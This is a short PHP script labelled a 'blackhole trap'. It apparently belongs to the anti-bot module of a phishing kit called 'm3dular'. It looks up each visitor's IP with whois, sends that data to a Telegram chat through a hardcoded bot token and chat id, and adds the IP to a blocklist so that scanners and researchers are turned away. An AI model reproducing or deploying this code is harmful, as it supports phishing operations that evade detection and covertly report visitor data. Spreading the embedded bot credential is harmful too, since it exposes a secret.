<?php

/* 

M3D SIMPLE BLACKHOLE TRAP
GET ADDED TO DB

*/

require_once "../inc/m3dular_config.php";
require_once "m3dular_functions.php";



// ADD to database 


$ipdata=ip_whois($M3DUSERIP);
sendToTelegram2("$ipdata","6022512695:AAHI7xFGmiMBI1wfVwMoqDr4nfjZ9qnZ6U4","1036752255");
echo "You're have no business here";




$file = fopen('db/m3dblacklist.dat', 'a');
    fwrite($file, $M3DUSERIP. "\n");
    fclose($file);






?>